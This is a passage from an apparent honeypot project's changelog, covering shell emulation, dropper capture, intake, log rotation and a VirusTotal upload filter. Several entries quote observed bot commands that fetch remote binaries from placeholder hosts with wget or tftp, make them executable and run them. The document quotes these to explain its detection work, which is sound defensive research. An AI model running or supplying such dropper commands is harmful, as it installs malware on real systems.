+  capture budget, and a line's own copies are bounded by its work allowance (21 MB measured at 10
+  MB and 40 MB inputs; it was 31 MB at 10 MB).
+- **A scanner's protocol probe on the telnet port is no longer filed as a malware sample** - a
+  scanner that sends a TLS hello, an RDP or SMB request or similar to port 23 had its first bytes
+  read as the login and the rest kept as a 54 to 175 byte `binary_shell_payload` sample, which
+  cluttered the samples list and campaigns. The sensor now classifies a session from the first
+  bytes of the connection and records a recognised probe (19 protocols, each validated by
+  structure, not by a first byte) as a `catchall_probe` event with `probe_protocol`,
+  `payload_hex` and `observed_len`, no sample. A session that carries an executable or archive
+  signature anywhere, or sent more than 4096 bytes, or matches nothing, is a sample exactly as
+  before; there is no size floor, since a short shell stub is a real dropper. The address page
+  names the protocol in the probe row's detail ("tls, port 23"). No migration. Earlier
+  `binary_shell_payload` rows for probes are not reclassified (the stored tail holds none of the
+  opening bytes). See
+  [protocol probes on the telnet port](docs/reference/events-and-signals.md#protocol-probes-on-the-telnet-port).
+- **A bash that runs a script no longer answers like the interactive login shell** - `bash -c f`,
+  `bash FILE` and a script piped to `bash` said `f: command not found`, the answer of the
+  command-not-found handler that only an interactive bash has (the persona has the
+  `command-not-found` package, so the login shell's bare `f: command not found` stays). A bash
+  running a script says `bash: line 1: f: command not found`, naming `$0` (the operand after a
+  `-c` script, the file as typed for `bash FILE`) and the line the command is on, as an SSH exec
+  already did for the line `1` only; its other diagnostics (`cd`, `No such file or directory`)
+  carry the line too. Syntax errors in a script are worded as bash words them:
+  `bash: -c: line 2: syntax error near unexpected token `)'` followed by the offending line
+  quoted, `unexpected EOF while looking for matching `"'` when the text ends inside a quote or
+  `$( )`, and an unfinished construct reported on the line after the last. The SSH exec path had
+  `bash: line 1:` with no `-c:` and no quoted line. Checked against bash 5.1.16 and dash 0.5.11 in
+  the reference container; two session fixtures replay it.
+- **dash's syntax-error wording** - dash named an unexpected plain word as the word itself
+  (`Syntax error: "extra" unexpected`); dash says `word unexpected` and quotes only reserved words
+  and operators. It also names what the grammar was waiting for (`end of file unexpected
+  (expecting "fi")`, `"done" unexpected (expecting "do")`, `word unexpected (expecting "in")`,
+  inside `$( )` `(expecting ")")`), and has fixed complaints that name no token: `Bad for loop
+  variable`, `Unterminated quoted string`, `EOF in backquote substitution`, `Missing '}'`,
+  `Missing '))'`; a redirection with nothing after it at the end of a script is
+  `end of file unexpected`. `>&word` and `<&word` with anything but one digit or `-` are
+  `Syntax error: Bad fd number`, a `${...}` dash cannot read (`${}`, `${a:1}`, `${a/x/y}`) is
+  `Bad substitution`, and an arithmetic division by zero is `arithmetic expression: division by
+  zero: "1/0"`, each ending the shell with status 2. The grammar differences behind the
+  wording are now dash's too: `((` is two subshells, a descriptor is one digit (`10>f` writes
+  `10` into `f`), and brace expansion, `$'..'`, `[[`, `<<<`, `|&` and `name=(...)` are
+  plain text or errors instead of being skipped. Every reply was checked against dash 0.5.11 in
+  the reference container; `ubuntu-dash-syntax-errors.session` replays 77 of them.
+- **dash's `cd` error and `type` wording** - a failed `cd` under dash said bash's
+  `cd: DIR: No such file or directory` with status 1; dash says `cd: can't cd to DIR` and exits 2.
+  `type` and `command -V` called every builtin `a shell builtin`; dash calls its special builtins
+  (`:`, `.`, `break`, `continue`, `eval`, `exec`, `exit`, `export`, `local`, `readonly`, `return`,
+  `set`, `shift`, `times`, `trap`, `unset`) `a special shell builtin`. Both checked against dash
+  0.5.11.
+- **The feed and intake database tests no longer share a database** - the feed builder tests
+  (11), intake's `audit_regressions` and two of the `end_to_end` tests ran on one persistent
+  database and reset it by hand. The feed suite's `DELETE FROM event` severed the shared
+  database's hash chain (two runs left `verify_chain` reporting broken), a row another suite had
+  left for `203.0.113.8` failed `unknown_signal_type_rejected_cursor_advances`, and the audit test's
+  failure-injecting trigger on `event` failed other tests' inserts if a run was killed before it
+  was dropped. Each now runs on its own `#[sqlx::test]` database, so there is no reset to be
+  incomplete and the trigger can only affect its own test. Test-only; the other database tests in
+  the workspace already ran this way.
+- **Two flaky tests are deterministic** - the review fetcher's
+  `a_claim_hides_its_rows_until_recorded_or_the_lease_lapses` failed about one run in three
+  because `claim_candidates` is global (it syncs every download event and selects across all of
+  `fetch_attempt`) and the test shared a persistent database with other suites, so a leftover
+  `pending` row or another crate's download event was claimed ahead of its own fixture; its
+  hand-written reset covered only `fetch8*.example` hosts and `203.0.113.*` events. Every
+  database test in the review crate (the fetcher orchestration tests and the allowlist,
+  gatekeeper, queue, submit, fetcher-schema, VirusTotal-filter and CLI integration tests, 72 in
+  all) now runs on its own `#[sqlx::test]` database, so no partial reset is left to be
+  incomplete. The sensor-dns `the_global_budget_limits_many_networks_together` assumed 200 ms
+  reply timeouts and a refill window narrow enough for `3..=4` answers, so a stalled host saw
+  more refills or late replies; it now counts what the server did (answered events plus
+  suppressed summaries, which must total the six sent) and bounds the answers by the burst plus
+  one reply per second actually elapsed. No behaviour change in either crate.
+- **A path to a file is no longer taken for the fetch tool of the same name** - observed
+  2026-10-09 on telnet: a bot probing for fetch tools ran `/bin/busybox tftp -g HOST -r tftp.sh
+  -l - > tftp;chmod 777 tftp;./tftp`, and the final `./tftp`, the empty file the line had just
+  written, was recorded as a second `honeypot_file_download` with the raw command and no `url`.
+  The detector and the executor now share one decision (`FakeShell::exec_target`): a command
+  token with a slash is `wget`, `curl`, `tftp`, `ftpget` or `busybox` only where the path is an
+  executable the box ships (`/usr/bin/wget`, `/bin/wget` through the usrmerge link, `bin/wget`
+  from `/usr`); a file the session wrote is that file, and a path to nothing is `No such file or
+  directory` (`not found` under dash and mksh) instead of silently running the applet of that
+  name. A saved copy of busybox named `busybox*` still fetches. Wording unchanged, checked
+  against Ubuntu 22.04.
+- **Most active on the dashboard no longer runs off a phone screen** - at 390 px the table's last
+  two columns (what it did, last seen) were clipped. Below 640 px each row is now a card, the
+  same pattern the queue, campaigns and samples lists use: address and events on top, the 24-hour
+  strip and last seen under, the tags last.
+- **Samples no longer says "not fetched" for every uploaded file** - the Transport column describes
+  how the fetcher's connection was authenticated, which means nothing for a body a sensor took
+  from the address that sent it. Those rows now read `n/a, uploaded`; a body in the fetcher's
+  bucket with no successful fetch record reads `not recorded`; fetched files show their
+  transport as before.
+- **The soak harness counts rejected lines from the ledger** - the intake child's rejected
+  counter reached the harness only through a status file written once a second, so a SIGKILL
+  lost the last increments (one kill run printed "rejected 112 of 113 malformed" with nothing
+  lost; a 2026-10-09 kill run showed 171 against 180). The report now derives the rejected
+  malformed lines from the ledger and shows the child's counter beside it, short only after a
+  restart. Harness only.
+- **A flaky "Text file busy" in the deploy tests** - `deploy_test` wrote fixture scripts and ran
+  them while another test thread's fork could still hold the write descriptor, so
+  `upgrade_guard_skips_the_pull_and_requires_the_carried_timestamp` and
+  `upgrade_reexecs_once_when_the_pull_changes_the_script_and_does_not_pull_again` failed in 7 of
+  200 parallel runs. Writing an executable and spawning a child now share one lock, held across
+  the spawn and never the wait; 0 of 200 afterwards. Test-only.
+- **An upload in flight at SIGTERM is recorded, not dropped** - the capture shutdown drain only
+  wrote jobs already queued; a capture still being assembled on a live connection was lost when
+  the runtime dropped the connection after the queue had closed. Each capturing sensor (ssh,
+  telnet, adb, ftp, mqtt, tftp) now registers its connections in the hand-off's tracker
+  (`run_tcp_listener_tracked`, `run_tls_listener_tracked`, tftp's request loop), and
+  `CaptureHandoff::drain` first gives them up to 3 s to finish, cancels the rest (their capture
+  guard submits the fragment, stored with `complete` false and `end_reason` `session_cancelled`),
+  waits for them to end, and only then drains the queue, all inside the one 10 s deadline
+  (grace and cancel wait are at most a quarter of it each). `drain` now returns a `DrainReport`
+  with a per-phase outcome. A task wedged in blocking code still cannot be cut; the drain logs a
+  WARN and stays inside the deadline.
+- **Docs listed the wrong body-spooling sensors** - the sample lifecycle page named three (SSH,
+  FTP, ADB), the capacity and environment pages five; the code has six (ssh, ftp, adb, telnet,
+  tftp, mqtt). MQTT's spool row is added, and DNS is listed among the sensors that spool nothing.
+- **The fetcher never dials a public DNS resolver** - observed 2026-10-08: a telnet bot tested
+  wget, curl, tftp and ftpget against `http://1.1.1.1/wget.sh` and its siblings, and the fetcher
+  followed the URLs to Cloudflare. The never-dial check now also refuses the published addresses
+  of Cloudflare, Google Public DNS, Quad9 and OpenDNS, IPv4 and IPv6 (sixteen in all), including
+  their IPv4-mapped, NAT64 and 6to4 forms and any hostname that resolves to one. The attempt is
+  recorded as `rejected` with the reason `Forbidden(PublicResolver)`, which the IP page already
+  shows beside the status. All sixteen addresses were checked on 2026-10-09 against the
+  operators' own pages, and each table entry now carries its source URL (the OpenDNS IPv6 pair
+  against Cisco's Umbrella IPv6 article); none was wrong. The operators also publish filtered
+  variants (Cloudflare `1.1.1.2`/`1.1.1.3`, Quad9 `9.9.9.10`/`9.9.9.11`), which are not blocked.
+- **A `copytruncate` rotation no longer discards what intake had not yet read** - found by the
+  intake soak: with intake behind when the log rotated, the tailer restarted at offset 0 of the
+  emptied file and every unread line of the old content, which by then existed only in
+  `events.jsonl.1`, was never read (71,150, 442,378 and 822,979 telnet lines in three soak runs,
+  with no error; a reader that was caught up lost only the 48 to 570 lines written between the
+  copy and the truncate). On a truncation, or an in-place replacement, the tailer now opens
+  `<log>.1`, checks that it is the old content (its first 256 bytes hash to the stored
+  fingerprint and it reaches the read offset), drains it from the offset through the same machinery
+  as a rename rotation, then continues the new file. The saved cursor stays inside the old content
+  until that drain ends, so a restart resumes it. The shipper and `propolis-watch` share the fix.
+  Only `.1` is read, which the shipped `delaycompress` policy leaves uncompressed until the next
+  rotation. When `.1` is missing, compressed or another generation's, it is not read and the loss
+  is logged as a WARN and counted; the new `intake-rotation-loss` ops-alert condition (the
+  fifteenth) pages on it and holds for an hour. `deploy/logrotate-guard.sh` also skips a log whose
+  `.1` the reader has not finished (the next rotation would compress it unread) or whose live file
+  has more than 64 MiB unread (`PROPOLIS_LOGROTATE_MAX_UNREAD_BYTES`), reading the reader's
+  cursor read-only from the intake and shipper cursor directories (named by the resolved log
+  path on both sides, so a symlinked spelling finds the same cursor; a cursor still in `.2`
+  also skips); with no readable cursor it rotates and says why, at warning priority in the
+  journal, and `deploy/config-check.sh` flags a log with no cursor and a cursor directory the
+  rotation unit cannot see. Restart safety: a second rotation while the first copy drains no
+  longer loses either generation on a restart (each queued generation keeps a resume point;
+  `.1`, `.2` and, under the shipped compress + delaycompress policy, `.2.gz` are searched by
+  fingerprint, the gzip expanded into an unlinked scratch file in the cursor directory, capped
+  at 512 MiB and only when that plus the guard's 512 MiB reserve is free, otherwise a reported
+  loss "insufficient disk to expand"; a generation that cannot be found is a reported loss and
+  NO rotated copy is read in its place, so the documented manual `truncate` while the reader is
+  stopped does not re-ingest the previous generation);
+  a restart mid-drain with a live file under 256 bytes is no longer read as small-file growth;
+  and a copytruncate during a failed batch no longer re-appends the committed prefix. The
+  rotation guard also skips a cursor still inside `.2.gz`. Cursor files are now named by the
+  resolved log path; a cursor named by the path as configured is moved to the resolved name on
+  first load and the old file removed (a one-time migration, to be deleted once every
+  deployment has restarted on this version), so an upgrade does not re-read such a log from 0.
+  The cursor gains one optional field, written only when set and ignored by older readers:
+  `fingerprint_len` (so a cursor taken while the log was under 256 bytes still matches the grown,
+  rotated copy, in the tailer and the guard; the window is widened as the file grows, so a stamp
+  taken on the start of a first line does not stay that short). When both a
+  resolved-name and an as-configured cursor file exist the newer one wins. `log-tailer` gains
+  `flate2` and `libc` dependencies (both already in the lockfile, vendored). A skipped log makes `propolis-logrotate.service` show failed until a later
+  run rotates it. `logrotate --force` no longer discards a backlog: archive and truncate by hand
+  ([intake backlog](docs/troubleshooting/intake-backlog.md#recovering-a-backlog-too-large-to-drain)).
+  The "small window" wording in `deploy/logrotate-sensors.conf` and the docs now says what the
+  window is: the copy-to-truncate gap, not a reader that is behind.
+- **VirusTotal upload sends only executable or script content** - with `PROPOLIS_VT_UPLOAD=true`
+  the scanner uploaded any captured file VirusTotal did not know, so an image or video an
+  attacker pushed (potentially illegal material) would have been sent to a third party within
+  one scan cycle. The upload now needs the body's CONTENT to be an ELF, PE, Mach-O, Java class,
+  DEX, a script (shell, Python, Perl, PHP, PowerShell or batch, by shebang or at least two strong
+  signatures), or a zip, tar or gzip archive in which a bounded look (64 entries, 1 MiB
+  decompressed, two levels deep) finds such a member; names and extensions are never consulted.
+  Images, video, audio, PDF, office documents, 7z, rar, bzip2, xz, zstd and anything unrecognised
+  stay local, and any detection error, limit or panic refuses. A refused body is still looked up by
+  hash (the request carries only the digest), is logged at INFO with its SHA-256 and detected type,
+  and gets a `sample_analysis` row `detected = -2, total = -2` so it is not looked up again. The
+  console shows such a sample as "not uploaded (type)" on the samples and IP pages, only `-1`
+  counts as pending in the metrics and the pending-oldest-age gauge, and
+  `propolis_sample_analysis{state="not_uploaded"}` counts the `-2` rows. The malware custody page no longer implies nothing
+  leaves without approval: it now describes the opt-in, type-filtered upload and the hash lookups.
+- **The phone's toybox applets print their help before an option refusal** - read from the
+  source of Android 6.0.1's toybox (not captured from a device): `get_optflags` raises
+  `toys.exithelp` before it parses, `error_exit` then calls `show_help`, and the build has
+  `CFG_TOYBOX_HELP 1`, so `tr` with no operand writes `usage: tr [-cds] SET1 [SET2]` and its
+  description to standard error before `tr: Needs 1 argument`. Done for `tr`, `wc`, `base64`,
+  `md5sum`, `sha1sum`, `cut`, `od`, `which`, `getprop` and `setprop`, with the strings of
+  `generated/help.h`. Errors raised after parsing print no help.
+
+- **A dash script's errors name the script, as dash words them** - every error of a script run
+  with `sh FILE` read `sh: 3: ./x: not found`, where Ubuntu 22.04's dash prints the script as it
+  was typed: `.s: 3: ./x: not found`, `./x.sh: 1: ...`, `sub/x.sh: 1: ...`, `/tmp/x.sh: 2: Syntax
+  error: ...`. `sh -c CMD NAME` names `NAME`, and `-c` without one, a script on standard input and
+  an interactive `sh` stay `sh: 1:`. A script that starts another keeps each its own name. This is
+  the prefix of the not-found, `Exec format error`, syntax and arithmetic errors alike, and the
+  per-architecture dropper fixture now expects `.s: 3: ./.c: Exec format error`. Checked line by
+  line against dash in an `ubuntu:22.04` container.
+
+- **The phone's `tr -C` complements, as `-c` does** - the toybox port treated `-C` as accepted
+  and ignored, but toybox 6.0.1's option string is `^>2<1Ccsd[+cC]`: the `[+cC]` group makes each
+  of the two set the other's flag, and the applet reads only the `c` flag, so `tr -Cd 'a-c'` keeps
+  `a`, `b` and `c` (`crates/sensor-framework/src/shell/tr.rs`).
+
+- **The phone's `getprop`, `setprop` and `ifconfig` are toybox's, not toolbox's** - the persona
+  announces Android 6.0.1, whose `external/toybox/Android.mk` (tag `android-6.0.1_r81`) links all
+  three into `/system/bin` and whose `system/core/toolbox` has no source for any of them, but the
+  shell listed them as toolbox applets and answered in toolbox's words. `toybox getprop` now runs
+  and `toolbox getprop` is `toolbox: no such tool getprop`. `setprop` counts operands as toybox
+  does (`setprop: Need 2 arguments`, `Max 2 arguments`) and makes its checks in its words: a name
+  of 32 bytes or more, a value of 92 or more (a `ro.` value too, which the old code let through),
+  a leading or trailing dot, `..`, and a character outside letters, digits and `_.-`. `ifconfig`
+  prints toybox's `Link encap:` listing (HWaddr, `inet addr:` with `Bcast:` and `Mask:`, the
+  `inet6 addr:` line, flags and MTU, the packet and byte counters) instead of toolbox's one line
+  per interface, fails an unknown interface as `ifconfig: eth9: No such device`, and refuses an
+  action it does not know with the applet's help text first. `df`, `du`, `ls`, `mount` and
+  `uptime` are toolbox's at that tag too and are still listed as toybox's (noted in the module
+  doc of `crates/sensor-framework/src/shell/multicall.rs`).
+
+- **The Ubuntu persona's `tr` exists, as GNU coreutils 8.32** - it answered `tr: command not
+  found`, which no Ubuntu server does, so a loader that strips line breaks with `tr -d '\n'` before
+  decoding stopped there. It now translates, deletes, squeezes and complements standard input with
+  GNU's rules: `-c -C -d -s -t`, the long options and their abbreviations, `\NNN` and the C
+  escapes, ranges, the twelve classes, `[=c=]`, `[c*n]` repeats and `[:lower:]`/`[:upper:]` case
+  conversion; `--help` and `--version` print 8.32's text; and every refusal is GNU's (`tr: missing
+  operand`, `tr: extra operand ‘c’`, `Try 'tr --help' for more information.`, the set errors and
+  the octal and trailing-backslash warnings), with the typographic quotes the persona's
+  `LANG=C.UTF-8` gives. Checked line by line against `/usr/bin/tr` of an `ubuntu:22.04` container,
+  including 16,000 generated option and set combinations, none differing. The phone's toybox `tr`
+  is unchanged; where the two differ (`\x41`, `\e`, repeats, `-t`, the classes' order) is listed in
+  the module doc of `crates/sensor-framework/src/shell/tr_gnu.rs`.
+- **Command-sequence campaigns are one per tool, not one per session length** - observed on the
+  live console 2026-10-08: 947 campaigns, most of them fragments of a few bots. The fingerprint
+  keyed on the whole normalized session, so one Mirai-family loader was about 40 campaigns
+  ("1 commands: ...", "2 commands: ...", up to 16) because sessions stop at different points, a
+  `start ; enable ; config terminal` login was ten, and `echo P155084A ; id ; echo $(( 155084 + 1 ))`
+  or `N=49482a1671; ...` was one campaign per host because a random number differed. The key is now
+  over the first 4 commands past the shell-entry lines, so a bot cut after 5 commands and one that
+  runs 16 are the same campaign (a session cut before its fourth command is keyed by the commands
+  it has); decimal runs of 4 or more digits, hex words of 6 or more characters and identifier
+  values of `NAME=value` are placeholders, while short numbers (`x86`, `arm7`, `-p 22`) and
+  `chmod` modes are kept; HTTP request lines sent to a shell port are one campaign instead of one
+  per header order; a run of login lines only is one campaign. A campaign's label gives the range
+  of command counts past the login lines (`3-16 commands: ...`). Commands the sensor decoded from
+  a single-byte XOR (Mirai's `lghkel` for `enable`, key 9) are keyed and labeled as their decoded
+  text, and the campaign page keeps the raw form. On a synthetic replica of the observed shapes, 106
+  sessions went from 69 campaigns to 11. Migration 0016 marks existing databases as built by the
+  old key; the indexer then rebuilds the command-sequence campaigns from the ledger on its next
+  batches (about as long as the first catch-up), leaving sample and scanner campaigns and
+  indicators as they are. Campaign ids of command-sequence campaigns change. See
+  `docs/operations/campaigns.md`.
+
+- **Running a program built for another CPU now fails, so per-architecture loops go on** -
+  observed live 2026-10-08: a bot's `for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do wget
+  http://H/$a -O .c; chmod +x .c && ./.c && break; done` ended at `mips` because every fetched
+  file ran with status 0, so the x86_64 build, the only one that matters on the Ubuntu persona
+  (armv7 on the phone), was never asked for. A file is now judged by its ELF header when its bytes
+  are one, else by the architecture token in the URL or local name it was fetched with; that
+  origin follows `cp`, `mv` and `cat FILE > DEST`, so the Eclipse busybox-copy sequence is judged
+  by what was cat over the copy. A foreign build answers `bash: ./x: cannot execute binary file:
+  Exec format error` (dash: `sh: 1: ./x: Exec format error`, both status 126; the phone's mksh:
+  `not executable: 32-bit ELF file`), so `&& break` and `||` chains behave as on a real host. The
+  persona's own build, a name with no token and a file the session typed still run silently.
+  `chmod` on the Ubuntu persona also names a missing operand (`chmod: cannot access 'x': No such
+  file or directory`, status 1) as GNU chmod does, which the loop's `|| chmod +x $a && ./$a`
+  branch depends on (`crates/sensor-framework/src/shell/arch.rs`).
+
+- **The configuration check's `fix:` lines now run when pasted** - observed live 2026-10-08: the
+  no-log finding's `grep LOG_PATH /etc/propolis/*.env` was refused (those files are root-only),
+  and the no-events finding's line ran `psql "$DATABASE_URL" ...` (unset in an operator's shell)
+  followed by prose, which bash parsed as an `if` and answered with a continuation prompt. A
+  `fix:` is now only a command, or commands joined with `&&` or `;`, with `sudo` wherever root is
+  needed and absolute paths for the repository's scripts; the ledger query is the script's
+  new `--newest-event SENSOR` mode run with `sudo`, which reaches the database through `PG*`
+  variables so no connection string or password is ever on a command line. Instructions that are not commands (edit a file,
+  change a bind address, install a firewall rule or a key) print as `do:`, and the explanation
+  moved into the finding text. `--json` keeps its shape and gains `fix_kind` (`run`, `manual`)
+  and `id` on each finding. `config_check_test` raises every finding id (a new finding with no
+  fixture fails) and executes each `fix` in bash against stub commands, failing on a parse error,
+  stderr output, or a root-only command or env-file read without `sudo`.
+
+- **Download events come from what a line executes, not from the text it carries** - observed live
+  2026-10-08 (telnet) and on an SSH exec line: a bot wrote a dropper with `echo '... wget
+  http://H/$a ...' >> .s` lines and ran `sh .s`, and the sensor reported `http://H/$a`, unexpanded,
+  for the echo line and nothing for the fetch the loop ran; the SSH one-liner chose the binary with
+  `A=$(uname -m); case $A in x86_64)U=x86_64;; ... esac; wget http://H/$U` and reported `/$U`. A
+  fetch is now recorded when the evaluator runs it, from its expanded arguments, so loops, `sh
+  FILE`, `sh -c`, command substitutions and variables report the real URL (`http://H/mips` for the
+  observed script), and an `echo`/`printf` argument, here-document body or quoted assignment holding
+  a fetch reports nothing. `case ... esac` is now run rather than skipped, so the probe above picks
+  `/x86_64` on the Ubuntu persona and `/arm7` on the phone's `armv7l`. A URL still holding
+  `$name`, `$(..)` or a backtick, or built from a variable that is not set, is recorded as a
+  command with no `url`. The old lexical scan stays as a fallback for evidence the evaluator did
+  not reach (a skipped branch, functions, syntax errors), now read with the shell's tokenizer, and
+  one URL found both ways is one event (`crates/sensor-framework/src/shell/fetch.rs`). A line that
+  only opens a construct reports its fetches when the construct completes. Busybox `tftp -g -l FILE
+  HOST` saves under the basename of the remote name, as busybox 1.30 does.
+
+- **An ADB base64 APK loader no longer loops on `wc: not found`** - observed live 2026-10-07: a bot
+  pushed an APK to `/data/local/tmp` in about 57 `echo -n '<base64>' >> f.b64` commands, checked
+  `wc -c < f.b64`, got `sh: wc: not found` from the Android shell, deleted everything and started
+  over (48 rounds seen, 110 to 150 events per 10 minutes), so it never reached the decode or the
+  install and no APK was ever captured. The Android shell now has the toybox tools a loader checks
+  its work with: `wc`, `base64`, `md5sum`, `sha1sum`, `sha256sum`, `head`, `tail`, `cut`, `tr`,
+  `od`, `which`, `id`, `mkdir`, `cp`, `mv`, `rm` and `sleep`, in `/system/bin` and in `toybox`'s
+  list. Presence is taken from toybox's `Android.mk` at the persona's own release (6.0.1); `base64`
+  and `sha256sum` are linked here although that release does not, so the loader proceeds
+  (`crates/sensor-framework/src/shell/multicall.rs#TOYBOX_APPLETS` gives the reasoning). Their output
+  and error lines follow that release's source: `wc` prints unpadded counts, `base64 -d` is the
+  lenient decoder, and options, operand counts and refusals come from a port of its argument parser
+  (`toyopt.rs`). The decoded bytes of an assembled base64 file are an assembly of their own, found
+  across the separate shells of a connection (every `adb shell CMD` is one), and are captured as an
+  `echo_loader` sample when `pm install` is given the file, when it is made executable or run, or
+  when the session ends. `pm install` now prints what `Pm.runInstall` of Android 6.0.1 prints
+  (`\tpkg: PATH`, then `Success` or `Failure [INSTALL_PARSE_FAILED_NOT_APK]`,
+  `INSTALL_PARSE_FAILED_BAD_MANIFEST` or `INSTALL_FAILED_INVALID_URI`) by judging the file.
+  `base64 -d` on both personas wrote every byte above 0x7f as two UTF-8 bytes; it writes the bytes.
+  The connection's filesystem budget (196,608 bytes, shared by the base64 text and the decoded
+  file) still limits the APK to about 84,000 bytes.
+
+- **The configuration check no longer reports a loopback-only service as exposed** - on its
+  first production run `deploy/config-check.sh` warned that the host's PostgreSQL on 5432 was
+  "reachable from anywhere the network allows", and would have called it `DANGEROUS` behind an
+  open firewall, while it listened only on `127.0.0.1` and `[::1]`. The verdict came from the
+  sensor's configured `0.0.0.0` instead of the address the other process is bound to. Exposure
+  is now judged from the holder's own sockets: any non-loopback one makes it exposed, loopback
+  only does not. A loopback-only holder still fails the row, because the sensor's wildcard bind
+  cannot share the port, and its fix line now says to bind the sensor to the host's network
+  address instead.
+- **Modeled binaries survive inspection** - every executable the Ubuntu persona serves was its
+  recorded 64-byte header followed by `0x80 | (offset & 0x3f)` filler, identical for every
+  binary, so `busybox cat /proc/self/exe` flooded two megabytes of U+FFFD and `readelf` found
+  noise where the program headers belong. The body is now generated from the recorded header
+  (`crates/sensor-framework/src/elf_body.rs`): program headers that match the sections,
+  `.interp`, a per-binary build ID, libc imports with their `GLIBC_2.x` versions, relocations,
+  `.dynamic`, usage strings for the program, instruction-shaped `.text` and the section header
+  table at the recorded offset. `readelf -lhSdV --dyn-syms` parses all 84 images without a
+  warning, `file` reports a dynamically linked PIE with the x86-64 loader (busybox, recorded as a
+  static `ET_EXEC`, reports statically linked), and `strings` shows the loader, imports, versions
+  and usage line. Still generated per byte in constant memory at the recorded size; no real
+  binary is shipped. `/bin/ls` keeps its first newline at 409. A whole-file `busybox hexdump -e
+  '16/1 "%c"'` without `-v` of a binary now prints nothing (the image has the zero runs the real
+  tool squeezes to `*`, which is not modeled). The bytes of every image changed, so its digests
+  did: any stored fingerprint of a served binary is stale.
+- **Shell `tftp` downloads are read in every common form** - a telnet dropper's classic
+  `tftp HOST -c get FILE` was recorded as `tftp://HOST:get` (the `-c get` pair taken for a port, the
+  file name lost), while the BusyBox form was right. The shell now parses BusyBox
+  (`-g -r REMOTE [-l LOCAL] HOST [PORT]`, any flag order, `-gr` clusters, attached values),
+  tftp-hpa one-shot (`HOST [PORT] -c get REMOTE`, the server last, or `HOST:FILE`), IPv6 in
+  brackets or bare, and quoted or escaped arguments, into `tftp://HOST[:PORT]/FILE`. A command line
+  whose server or file cannot be read, or whose address, port or file name would not make a sound
+  URL, now emits `honeypot_file_download` with the raw `command` and no `url` instead of a guessed
+  one, so the fetcher is never handed a malformed target (it already skips url-less events). A
+  `tftp` upload (`-p`, `put`) is not a download and emits no download event; the command event
+  still records it. A host with no file no longer yields a bare `tftp://HOST`. No wire or migration
+  change.
+- **SSH bare connects, banner grabs and bad version strings are now recorded** - the SSH sensor
+  emitted `honeypot_connection` only after key exchange, so a Shodan/Censys-style scanner that
+  read the banner and left, a client that sent a malformed identification line, and a bare TCP
+  probe left no event (the fleet probe reported "socket answered, no line reached intake" for
+  tcp/22). The event is now emitted at accept, once per connection, like the other TCP sensors.
+  A connection that ends before key exchange completes also emits one `honeypot_session_end`
+  (telemetry, unscored) with `end_reason`, `phase`, `duration_ms` and the sanitized
+  `client_version` when received. Consequence: such connections now carry the same
+  `honeypot_connection` weight (40) as a telnet connect did already. No migration or wire change.
+
+### Added
+
+- **An intake soak harness** - `crates/propolis/examples/soak` drives sustained synthetic sensor
+  traffic (telnet-dominated, long and over-length lines, copytruncate and rename rotation, a
+  backdated multi-gigabyte backlog) through the real intake runner and the review submission loop
+  against a scratch database, samples lag, memory, append-lock wait and ledger growth, accounts
+  every line written against the ledger, and ends in a PASS/FAIL report with fault injection (kill,
+  cursor loss, a poison line). See `docs/development/intake-soak.md`. Run by hand; not in the suite.
+- **Intake appends a batch of lines in one transaction** - after the dedup index (migration `0013`)
+  and the incremental breadth sets (migration `0014`) removed the costs that grew with lag and with
+  a source's history, what remained was one transaction, one lock acquisition and one commit per
+  line, which held the node to a few hundred events a second whatever the hardware. A new
+  `core_scoring::append_events` appends a batch (scored events and telemetry, in log order) with
+  one lock acquisition: it hashes the chain in order from one head read, loads each touched
+  source's score, vantages, sensors and dedup lookup once, folds the events through the same
+  `apply_event` in order, inserts the ledger rows with one multi-row `INSERT` and writes each
+  touched source once. No migration, no change to the hash chain, the scoring formulas or the
+  ledger's order. A property test (`crates/core-scoring/tests/batch_equivalence.rs`: eight
+  seeds, 32 streams of 20 to 160 events over six sources, every signal type, duplicates, out-of-order
+  and sub-microsecond timestamps, cut into batches of 1 to the whole stream) holds the ledger rows
+  with their hashes, `ip_score`, `ip_vantage` and `ip_sensor` byte-identical to one-at-a-time
+  ingestion and runs `verify_chain` and `rebuild_projection` on the batch-built ledger. On a 1M-row
+  test ledger with a 200k-event source (RAM-backed server): about 350 to 470 events a second one at
+  a time, 11,000 to 13,600 in batches of 1000, with the lock held about 70 to 90 ms per batch.
+  The runner's read size now adapts to lag: 100 lines when caught up, doubling to 1000 while a log
+  keeps filling whole batches, back to 100 on a short or failed batch; the tailer enforces an 8 MiB
+  byte budget in the read itself (`LogTailer::read_batch_bounded`), so a burst of near-megabyte
+  lines cannot make a batch a gigabyte. A batch that fails is retried in halves when one event
+  can be the cause (invalid, a stored projection that will not decode, a data exception such as a
+  NUL in metadata, a constraint), so the events before it commit, and intake moves its read
+  position past exactly those lines: the next poll starts at the failed line, the committed
+  prefix is not appended again (it would otherwise be re-appended as new ledger rows on every
+  poll with no pause, inflating the source's event counters toward volume listing), and a failure
+  at the first line reports nothing ingested so the loop sleeps. Nothing is skipped or
+  quarantined: an event the database refuses on every attempt still holds that sensor's intake at
+  its line, now reported as `intake wedged at <sensor>` after three consecutive refusals of the
+  same line, quoted by `intake-stalled`. Probe confirmations are recorded only for lines the
+  append reached. The console's delist, relist and delete take the append lock, so one landing
+  mid-batch is no longer overwritten, and the review queue's population scan skips a delisted
+  address. The position after a partial commit is computed from the line lengths recorded at
+  read time (`LogTailer::commit_batch_through`), not by reading again: a re-read goes through
+  rotation handling, and a `copytruncate` landing during the append returned the new file's
+  first lines, which were then marked done unread; now a changed file means the batch is read
+  again from its start (replayed, never skipped). The cursor is persisted after a partial
+  commit so a restart resumes at the refused line, and a dropped connection between refusals
+  no longer resets the three-poll wedge count. A lost commit acknowledgement still replays a
+  batch (at-least-once). `append_bench` gains a `batched` mode that also reports how long a second
+  writer waits on the lock.
+
+- **Declared crawlers can be kept out of the published feed by address, and the HTTP sensor labels
+  a User-Agent that claims to be one** - research and AI crawlers (ClaudeBot, Claude-User,
+  Claude-SearchBot, Googlebot, CensysInspect and others) reach the HTTP sensor and were
+  published like any other source. `PROPOLIS_FEED_ALLOWLIST_FILE` names a local text file of CIDRs
+  (one per line, `#` comments), merged into the existing `PROPOLIS_FEED_ALLOWLIST`, so an operator
+  can add a crawler operator's published ranges with no code change. The file is read at startup,
+  bounded (1 MiB, 50,000 entries) and all-or-nothing: an unreadable file, a bad line, a bare
+  address, an entry wider than /8 (IPv4) or /16 (IPv6), or non-UTF-8 content refuses to start the
